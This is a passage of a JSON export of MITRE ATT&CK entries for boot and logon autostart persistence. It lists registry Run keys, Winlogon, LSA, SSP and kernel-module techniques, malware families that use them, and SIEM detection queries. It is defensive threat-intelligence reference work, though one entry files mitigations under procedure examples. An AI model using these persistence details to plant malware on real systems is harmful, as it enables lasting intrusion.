      "Flagprohas dropped an executable file to the startup directory.[102]",
      "FLASHFLOODachieves persistence by making an entry in the Registry's Run key.[40]",
      "FlawedAmmyyhas established persistence via theHKCU\\SOFTWARE\\microsoft\\windows\\currentversion\\runregistry key.[10]",
      "FunnyDreamcan use a Registry Run Key and the Startup folder to establish persistence.[59]",
      "Gamaredon Grouptools have registered Run keys in the registry to give malicious VBS files persistence.[103][104][105][106]",
      "Gazercan establish persistence by creating a .lnk file in the Start menu.[107][108]",
      "Gelsemiumcan set persistence with a Registry run key.[109]",
      "gh0st RAThas added a Registry Run key to establish persistence.[110][111]",
      "Gold Dragonestablishes persistence in the Startup folder.[112]",
      "Gootloadercan create an autorun entry for a PowerShell script to run at reboot.[113]",
      "Gorgon Groupmalware can create a .lnk file and add a Registry Run key to establish persistence.[114]",
      "Grandoreirocan use run keys and create link files in the startup folder for persistence.[115][116]",
      "GRIFFONhas used a persistence module that stores the implant inside the Registry, which executes at logon.[117]",
      "GrimAgentcan set persistence with a Registry run key.[118]",
      "GuLoadercan establish persistence via the Registry underHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce.[119]",
      "Hancitorhas added Registry Run keys to establish persistence.[120]",
      "Helminthestablishes persistence by creating a shortcut in the Start Menu folder.[121]",
      "Heyoka Backdoorcan establish persistence with the auto start function including using the valueEverNoteTrayUService.[122]",
      "Hi-Zorcreates a Registry Run key to establish persistence.[123]",
      "Higaisaadded a spoofed binary to the start-up folder for persistence.[124][125]",
      "HTTPBrowserhas established persistence by setting theHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runkey value forwdmto the path of the executable. It has also used the Registry entryHKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn \"%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe\"to establish persistence.[126][127]",
      "IcedIDhas established persistence by creating a Registry run key.[128]",
      "Inceptionhas maintained persistence by modifying Registry run key valueHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\.[129]",
      "SomeInnaputRATvariants establish persistence by modifying the Registry keyHKU\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Run:%appdata%\\NeutralApp\\NeutralApp.exe.[130]",
      "InvisiMolecan place a lnk file in the Startup Folder to achieve persistence.[131]",
      "Ixeshecan achieve persistence by adding itself to theHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunRegistry key.[132]",
      "JCryhas created payloads in the Startup directory to maintain persistence.[133]",
      "JHUHUGIThas used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.[134]",
      "Kasidetcreates a Registry Run key to establish persistence.[135][136]",
      "Kazuaradds a sub-key under several Registry run keys.[137]",
      "SeveralKe3changbackdoors achieved persistence by adding a Run key.[138]",
      "Kimsukyhas placed scripts in the startup folder for persistence and modified theHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceRegistry key.[139][37][140][141][142]",
      "Koadichas added persistence to theHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunRegistry key.[143]",
      "KOCTOPUScan set the AutoRun Registry key with a PowerShell command.[143]",
      "A version ofKONNIhas dropped a Windows shortcut into the Startup folder to establish persistence.[144]",
      "Latrodectuscan set an AutoRun key to establish persistence.[145]",
      "Lazarus Grouphas maintained persistence by loading malicious code into a startup folder or by adding a Registry Run key.[146][147][148][149]",
      "LazyScripterhas achieved persistence via writing a PowerShell script to the autorun registry key.[143]",
      "Leviathanhas used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.[150][151]",
      "LiteDukecan create persistence by adding a shortcut in theCurrentVersion\\RunRegistry key.[92]",
      "LockBit 2.0can use a Registry Run key to establish persistence at startup.[152]",
      "LoJaxhas modified the Registry key‘HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute’from‘autocheck autochk’to‘autocheck autoche’in order to execute its payload during Windows startup.[153]",
      "LookBacksets up a Registry Run key to establish a persistence mechanism.[154]",
      "Lucifercan persist by setting Registry key valuesHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusicandHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic.[155]",
      "LuminousMothhas used malicious DLLs that setup persistence in the Registry KeyHKCU\\Software\\Microsoft\\Windows\\Current Version\\Run.[156][157]",
      "Lumma Stealerhas created registry keys to maintain persistence usingHKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.[158][159]",
      "Macheteused the startup folder for persistence.[160][161]",
      "Magic Houndmalware has used Registry Run keys to establish persistence.[162][163][164]",
      "MagicRATcan persist using malicious LNK objects in the victim machine Startup folder.[165]",
      "MarkiRATcan drop its payload into the Startup directory to ensure it automatically runs when the compromised system is started.[166]",
      "Matryoshkacan establish persistence by adding Registry Run keys.[167][168]",
      "Mazehas created a file named \"startup_vrun.bat\" in the Startup folder of a virtual machine to establish persistence.[169]",
      "MCMDcan use Registry Run Keys for persistence.[170]",
      "Metamorfohas configured persistence to the Registry keyHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, Spotify =% APPDATA%\\Spotify\\Spotify.exeand used .LNK files in the startup folder to achieve persistence.[171][172][173][174]",
      "Mispaducreates a link in the startup folder for persistence.[175]Mispaduadds persistence via the registry keyHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.[176]",
      "Mivastcreates the following Registry entry:HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Micromedia.[177]",
      "MoleNetcan achieve persitence on the infected machine by setting the Registry run key.[178]",
      "Moleratssaved malicious files within the AppData and Startup folders to maintain persistence.[179]",
      "Mongallcan establish persistence with the auto start function including using the valueEverNoteTrayUService.[122]",
      "Moonstone Sleetused registry run keys for process execution during initial victim infection.[180]",
      "Mosquitoestablishes persistence under the Registry keyHKCU\\Software\\Run auto_update.[181]",
      "MuddyWaterhas added Registry Run keyKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncodingto establish persistence.[182][183][184][185][186][187]",
      "Mustang Pandahas created the registry keyHKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobelmdyUto maintain persistence.[188]",
      "Naikonhas modified a victim's Windows Run registry to establish persistence.[189]",
      "NanHaiShumodifies the %regrun% Registry to point itself to an autostart mechanism.[190]",
      "NanoCorecreates a RunOnce key in the Registry to execute its VBS scripts each time the user logs on to the machine.[191]",
      "NavRATcreates a Registry key to ensure a file gets executed upon reboot in order to establish persistence.[192]",
      "Nebulaecan achieve persistence through a Registry Run key.[189]",
      "The \"SCOUT\" variant ofNETEAGLEachieves persistence by adding itself to theHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunRegistry key.[40]",
      "NETWIREcreates a Registry start-up entry to establish persistence.[193][194][119][195]",
      "njRAThas added persistence via the Registry keyHKCU\\Software\\Microsoft\\CurrentVersion\\Run\\and dropped a shortcut in%STARTUP%.[196][197]",
      "NOKKIhas established persistence by writing the payload to the Registry keyHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.[198]",
      "ObliqueRATcan gain persistence by a creating a shortcut in the infected user's Startup directory.[199]",
      "Octopusachieved persistence by placing a malicious executable in the startup directory and has added theHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Runkey to the Registry.[200]",
      "Okrumestablishes persistence by creating a .lnk shortcut to itself in the Startup folder.[201]",
      "DuringOperation Dream Job,Lazarus Groupplaced LNK files into the victims' startup folder for persistence.[202]",
      "DuringOperation Sharpshooter, a first-stage downloader installedRising Sunto%Startup%\\mssync.exeon a compromised host.[203]",
      "Patchworkhas added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key.[204][205]",
      "Pikabotmaintains persistence following system checks through the Run key in the registry.[206]",
      "Pisloaderestablishes persistence via a Registry Run key.[207]",
      "PLAINTEEgains persistence by adding the Registry keyHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce.[208]",
      "PlugXadds Run key entries in the Registry to establish persistence.[209][58][210]",
      "PoetRAThas added a registry key in thehive for persistence.[211]",
      "PoisonIvycreates run key Registry entries pointing to a malicious executable dropped to disk.[212]",
      "PowerDukeachieves persistence by using various Registry Run keys.[213]",
      "PowerShowersets up persistence with a Registry run key.[214]",
      "POWERSOURCEachieves persistence by setting a Registry Run key, with the path depending on whether the victim account has user or administrator access.[215]",
      "PowerSploit'sNew-UserPersistenceOptionPersistence argument can be used to establish via theHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunRegistry key.[216][217]",
      "POWERTONcan install a Registry Run key for persistence.[218]",
      "Prikormkaadds itself to a Registry Run key with the name guidVGA or guidVSA.[219]",
      "PROMETHIUMhas used Registry run keys to establish persistence.[220]",
      "Pteranodoncopies itself to the Startup folder to establish persistence.[221]",
      "PUNCHBUGGYhas been observed using a Registry Run key.[222][223]",
      "Pupyadds itself to the startup folder or adds itself to the Registry keySOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runfor persistence.[224]",
      "A dropper used byPutter Pandainstalls itself into the ASEP Registry keyHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runwith a value named McUpdate.[225]",
      "QakBotcan maintain persistence by creating an auto-run Registry key.[226][227][228][229]",
      "If theQuasarRATclient process does not have administrator privileges it will add a registry key toHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runfor persistence.[230][231]",
      "Ramsayhas created Registry Run keys to establish persistence.[232]",
      "RansomHubhas created an autorun Registry key through the-safeboot-instance -passcommand line argument.[233]",
      "Raspberry Robinwill use a Registry key to achieve persistence through reboot, setting a RunOnce key such as:HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce{random value name} = \"rundll32 shell32 ShellExec_RunDLLA REGSVR /u /s \"{dropped copy path and file name}\"\".[234]",
      "RCSessionhas the ability to modify a Registry Run key to establish persistence.[60][235]",
      "Reavercreates a shortcut file and saves it in a Startup folder to establish persistence.[236]",
      "RedCurlhas established persistence by creating entries inHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.[237][238]",
      "Mustang Pandaused Run registry keys with names such asOneNote Updateto execute legitimate executables that would load through search-order hijacking malicious DLLS to ensure persistence duringRedDelta Modified PlugX Infection Chain Operations.[239]",
      "RedLeavesattempts to add a shortcut file in the Startup folder to achieve persistence. If this fails, it attempts to add Registry Run keys.[58][240]",
      "Remcoscan add itself to the Registry keyHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runfor persistence.[241]",
      "Remexiutilizes Run Registry keys in the HKLM hive as a persistence mechanism.[242]",
      "Rifdoorhas created a new registry entry atHKEY_CURRENT_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Graphicswith a value ofC:\\ProgramData\\Initech\\Initech.exe /run.[243]",
      "ROADSWEEPhas been placed in the start up folder to trigger execution upon user login.[244]",
      "Rocke's miner has created UPX-packed files in the Windows Start Menu Folder.[245]",
      "RogueRobincreated a shortcut in the Windows startup folder to launch a PowerShell script each time the user logs in to establish persistence.[246]",
      "Roverpersists by creating a Registry entry inHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\.[247]",
      "RTMtries to add a Registry Run key under the name \"Windows Update\" to establish persistence.[248]",
      "RTMhas used Registry run keys to establish persistence for theRTMTrojan and other tools, such as a modified version of TeamViewer remote desktop software.[248][249]",
      "RunningRATadds itself to the Registry keySoftware\\Microsoft\\Windows\\CurrentVersion\\Runto establish persistence upon reboot.[112]",
      "Ryukhas used the Windows command line to create a Registry entry underHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runto establish persistence.[250]",
      "S-Typemay create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry keyHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of Unique Identifier}.[251]",
      "Saint Bothas established persistence by being copied to the Startup directory or through the\\Software\\Microsoft\\Windows\\CurrentVersion\\Runregistry key.[252][253]",
      "MostSakulasamples maintain persistence by setting the Registry Run keySOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\in the HKLM or HKCU hive, with the Registry value and file name varying by sample.[254]",
      "SDBbothas the ability to add a value to the Registry Run key to establish persistence if it detects it is running with regular user privilege.[255][256]",
      "SeaDukeis capable of persisting via the Registry Run key or a .lnk file stored in the Startup directory.[257]",
      "Seasaltcreates a Registry entry to ensure infection after reboot underHKLM\\Software\\Microsoft\\Windows\\currentVersion\\Run.[258]",
      "ServHelpermay attempt to establish persistence via theHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\run key.[259]",
      "SharpStagehas the ability to create persistence for the malware using the Registry autorun key and startup folder.[178]",
      "ShimRathas installed a registry based start-up keyHKCU\\Software\\microsoft\\windows\\CurrentVersion\\Runto maintain persistence should other methods fail.[260]",
      "SHIPSHAPEachieves persistence by creating a shortcut in the Startup folder.[40]",
      "Sidewinderhas added paths to executables in the Registry to establish persistence.[261][262][263]",
      "Silencehas usedHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, and the Startup folder to establish persistence.[264]",
      "SILENTTRINITYcan establish a LNK file in the startup folder for persistence.[265]",
      "Small Sievehas the ability to add itself toHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosiftfor persistence.[266]",
      "Smoke Loaderadds a Registry Run key for persistence and adds a script in the Startup folder to deploy the payload.[267]",
      "SMOKEDHAMhas usedreg.exeto create a Registry Run key.[268]",
      "Snip3can create a VBS file in startup to persist after system restarts.[269]",
      "SNUGRIDEestablishes persistence through a Registry Run key.[270]",
      "SPACESHIPachieves persistence by creating a shortcut in the current user's Startup folder.[40]",
      "To establish persistence,SslMMidentifies the Start Menu Startup directory and drops a link to its own executable disguised as an \"Office Start,\" \"Yahoo Talk,\" \"MSN Gaming Z0ne,\" or \"MSN Talk\" shortcut.[271]",
      "STARWHALEcan establish persistence by installing itself in the startup folder, whereas the GO variant has created aHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMregistry key.[272][273]",
      "Storm-1811has created Windows Registry Run keys that execute various batch scripts to establish persistence on victim devices.[274]",
      "StrongPitycan use theHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunRegistry key for persistence.[220]",
      "Sykipothas been known to establish persistence by adding programs to the Run Registry key.[275]",
      "SysUpdatecan use a Registry Run key to establish persistence.[276]",
      "TA2541has placed VBS files in the Startup folder and used Registry run keys to establish persistence for malicious payloads.[277]",
      "Taidoorhas modified theHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runkey for persistence.[278]",
      "TAINTEDSCRIBEcan copy itself into the current user’s Startup folder as \"Narrator.exe\" for persistence.[279]",
      "TeamTNThas added batch scripts to the startup folder.[280]",
      "Threat Group-3390's malware can add a Registry key toSoftware\\Microsoft\\Windows\\CurrentVersion\\Runfor persistence.[281][282]",
      "ThreatNeedlecan be loaded into the Startup folder (%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrives.lnk) as a Shortcut file for persistence.[283]",
      "TINYTYPHONinstalls itself under Registry Run key to establish persistence.[41]",
      "TinyZBotcan create a shortcut in the Windows startup folder for persistence.[284]",
      "TrickBotestablishes persistence in the Startup folder.[285]",
      "Trojan.Karaganycan create a link to itself in the Startup folder to automatically start itself upon system restart.[38][286]",
      "Tropic Trooperhas created shortcuts in the Startup folder to establish persistence.[287][288]",
      "Truvasysadds a Registry Run key to establish persistence.[289]",
      "Turiancan establish persistence by adding Registry Run keys.[290]",
      "ATurlaJavascript backdoor added a local_update_check value under the Registry keyHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runto establish persistence. Additionally, aTurlacustom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.[181][291][292]",
      "TURNEDUPis capable of writing to a Registry Run key to establish.[293]",
      "Ursnifhas used Registry Run keys to establish automatic execution at system startup.[294][295]",
      "USBStealerregisters itself under a Registry Run key with the name \"USB Disk Security.\"[296]",
      "Vasportcopies itself to disk and creates an associated run key Registry entry to establish.[297]",
      "VBShowerusedHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\[a-f0-9A-F]{8}to maintain persistence.[298]",
      "WarzoneRATcan add itself to theHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunandHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UIF2IS20VKRegistry keys.[299]",
      "Windshifthas created LNK files in the Startup folder to establish persistence.[300]",
      "Winnti for Windowscan add a service namedwind0wsto the Registry to achieve persistence after reboot.[301]",
      "Wizard Spiderhas established persistence via the Registry keyHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runand a shortcut within the startup folder.[302][303]",
      "Xbashcan create a Startup item for persistence if it determines it is on a Windows system.[304]",
      "XLoaderestablishes persistence by copying its executable in a subdirectory of%APPDATA%or%PROGRAMFILES%, and then modifies Windows Registry Run keys or policies keys to execute the executable on system start.[305][306]",
      "Zebrocycreates an entry in a Registry Run key for the malware to execute on startup.[307][308][309]",
      "Zeus Pandaadds persistence by creating Registry Run keys.[310][311]",
      "ZIRCONIUMhas created a Registry Run key namedDropbox Update Setupto establish persistence for a malicious Python binary.[312]"
    ]
  },
  "T1547.002": {
    "Name": "Boot or Logon Autostart Execution:Authentication Package",
    "Description": "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.[1]Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry locationHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\with the key value of\"Authentication Packages\"=<target binary>. The binary will then be executed by the system when the authentication packages are loaded.",
    "Detects": [
      "Monitor executed commands and arguments that may abuse authentication packages to execute DLLs when the system boots.",
      "Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned DLLs try to load into the LSA by setting the Registry keyHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exewith AuditLevel = 8.[3][4]",
      "Monitor the Registry for changes to the LSA Registry keys. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned DLLs try to load into the LSA by setting the Registry keyHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exewith AuditLevel = 8.[3][4]"
    ],
    "Procedure Examples": [
      "Flamecan use Windows Authentication Packages for persistence.[2]"
    ]
  },
  "T1547.003": {
    "Name": "Boot or Logon Autostart Execution:Time Providers",
    "Description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.[1]W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.[2]Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys ofHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\.[2]The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.[2]Adversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in theDllNamevalue. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.[3]",
    "Detects": [
      "Monitor executed commands and arguments that may abuse time providers to execute DLLs when the system boots.",
      "There is no restriction on the number of custom time providers registrations, though each may require a DLL payload written to disk.[3]",
      "Monitor newly executed processes, such as the W32tm.exe utility.[4]The Sysinternals Autoruns tool may also be used to analyze auto-starting locations, including DLLs listed as time providers.[5]",
      "Monitor for changes made to windows registry keys and/or values modifying W32Time information in the Registry."
    ],
    "Procedure Examples": [
      "Consider using Group Policy to configure and block additions/modifications to W32Time DLLs.[4]",
      "Consider using Group Policy to configure and block modifications to W32Time parameters in the Registry.[4]"
    ]
  },
  "T1547.004": {
    "Name": "Boot or Logon Autostart Execution:Winlogon Helper DLL",
    "Description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries inHKLM\\Software[\\Wow6432Node\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\andHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\are used to manage additional helper programs and functionalities that support Winlogon.[1]Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:[1]Winlogon\\Notify - points to notification package DLLs that handle Winlogon eventsWinlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs onWinlogon\\Shell - points to explorer.exe, the system shell executed when a user logs onAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",
    "Detects": [
      "Monitor executed commands and arguments that may abuse features of Winlogon to execute DLLs and/or executables when a user logs in.",
      "New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
      "Monitor for the execution of processes that may abuse features of Winlogon to execute DLLs and/or executables when a user logs in.Analytic 1 - Modification of the Winlogon Registry Key(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") | where  (CommandLine LIKE \"%Microsoft\\Windows NT\\CurrentVersion\\Winlogon%\" AND (CommandLine LIKE \"%Userinit%\" OR CommandLine LIKE \"%Shell%\" OR CommandLine LIKE \"%Notify%\"))  AND  (CommandLine LIKE \"%reg%\" OR CommandLine LIKE \"%add%\" OR CommandLine LIKE \"%/d%\" OR  CommandLine LIKE \"%Set-ItemProperty%\" OR CommandLine LIKE \"%New-ItemProperty%\" CommandLine LIKE \"%-value%\")",
      "Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values.[19]Analytic 1 - Registry Edit with Modification of Userinit, Shell or Notifysource=\"WinEventLog:Security\" EventCode=\"4657\" (ObjectValueName=\"Userinit\" OR ObjectValueName=\"Shell\" OR ObjectValueName=\"Notify\") OR source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"13\" (TargetObject=\"Userinit\" OR TargetObject=\"Shell\" OR TargetObject=\"*Notify\")"
    ],
    "Procedure Examples": [
      "Bazarcan use Winlogon Helper DLL to establish persistence.[2]",
      "Cannonadds the Registry keyHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogonto establish persistence.[3]",
      "DarkTortillahas established persistence via theSoftware\\Microsoft\\Windows NT\\CurrentVersion\\Winlogonregistry key.[4]",
      "ADipsindvariant registers as a Winlogon Event Notify DLL to establish persistence.[5]",
      "Gazercan establish persistence by setting the value \"Shell\" with \"explorer.exe, %malware_pathfile%\" under the Registry keyHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.[6]",
      "KeyBoyissues the commandreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"to achieve persistence.[7][8]",
      "LockBit 3.0can enable automatic logon through theSOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\WinlogonRegistry key.[9]",
      "Remexiachieves persistence using Userinit by adding the Registry keyHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit.[10]",
      "Revenge RATcreates a Registry key atHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shellto survive a system reboot.[11]",
      "Tropic Trooperhas created the Registry keyHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shelland sets the value to establish persistence.[12][13]",
      "Turlaestablished persistence by adding a Shell value under the Registry keyHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.[14]",
      "Wizard Spiderhas established persistence using Userinit by adding the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.[15]"
    ]
  },
  "T1547.005": {
    "Name": "Boot or Logon Autostart Execution:Security Support Provider",
    "Description": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.The SSP configuration is stored in two Registry keys:HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security PackagesandHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.[1]",
    "Detects": [
      "Monitor executed commands and arguments that may abuse security support providers (SSPs) to execute DLLs when the system boots.",
      "Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry keyHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exewith AuditLevel = 8.[1][6]",
      "Monitor the Registry for changes to the SSP Registry keys. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry keyHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exewith AuditLevel = 8.[1][6]"
    ],
    "Procedure Examples": [
      "Empirecan enumerate Security Support Providers (SSPs) as well as utilizePowerSploit'sInstall-SSPandInvoke-Mimikatzto install malicious SSPs and log authentication events.[2]",
      "TheMimikatzcredential dumper contains an implementation of an SSP.[3]",
      "PowerSploit'sInstall-SSPPersistence module can be used to establish by installing a SSP DLL.[4][5]"
    ]
  },
  "T1547.006": {
    "Name": "Boot or Logon Autostart Execution:Kernel Modules and Extensions",
    "Description": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.[1]When used maliciously, LKMs can be a type of kernel-modeRootkitthat run with the highest operating system privilege (Ring 0).[2]Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.[3]Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded throughkextloadandkextunloadcommands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.[4]Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.[5]Adversaries can use LKMs and kexts to conductPersistenceand/orPrivilege Escalationon a system. Examples have been found in the wild, and there are some relevant open source projects as well.[6][7][8][9][10][11][12][13]",
    "Detects": [
      "Loading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands:modprobe,insmod,lsmod,rmmod, ormodinfo[25]Adversaries may run commands on the target system before loading a malicious module in order to ensure that it is properly compiled.[3]Adversaries may also execute commands to identify the exact version of the running Linux kernel and/or download multiple versions of the same .ko (kernel object) files to use the one appropriate for the running system.[13]Many LKMs require Linux headers (specific to the target kernel) in order to compile properly. These are typically obtained through the operating systems package manager and installed like a normal package.On macOS, monitor for execution ofkextloadcommands and user installed kernel extensions performing abnormal and/or potentially malicious activity (such as creating network connections). Monitor for new rows added in thekext_policytable. KextPolicy stores a list of user approved (non Apple) kernel extensions and a partial history of loaded kernel modules in a SQLite database,/var/db/SystemPolicyConfiguration/KextPolicy.[26][27][28]",
      "Monitor for newly constructed files that may modify the kernel to automatically execute programs on system boot.",
      "Monitor for changes made to files that may modify the kernel to automatically execute programs on system boot.",
      "LKMs are typically loaded into/lib/modulesand have had the extension .ko (\"kernel object\") since version 2.6 of the Linux kernel.[29]",
      "Monitor for newly created processes that may modify the kernel to automatically execute programs on system boot."
    ],
    "Procedure Examples": [
      "Drovorubcan use kernel modules to establish persistence.[14]",
      "DuringOperation CuckooBees, attackers used a signed kernel rootkit to establish additional persistence.[15]",
      "Skidmaphas the ability to install several loadable kernel modules (LKMs) on infected machines.[13]"
    ]
  },
  "T1547.007": {
    "Name": "Boot or Logon Autostart Execution:Re-opened Applications",
    "Description": "Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\".[1]When selected, all applications currently open are added to a property list file namedcom.apple.loginwindow.[UUID].plistwithin the~/Library/Preferences/ByHostdirectory.[2][3]Applications listed in this file are automatically reopened upon the user’s next logon.Adversaries can establishPersistenceby adding a malicious application path to thecom.apple.loginwindow.[UUID].plistfile to execute payloads when a user logs in.",
    "Detects": [
      "Monitor executed commands and arguments that may modify plist files to automatically run an application when a user logs in.",
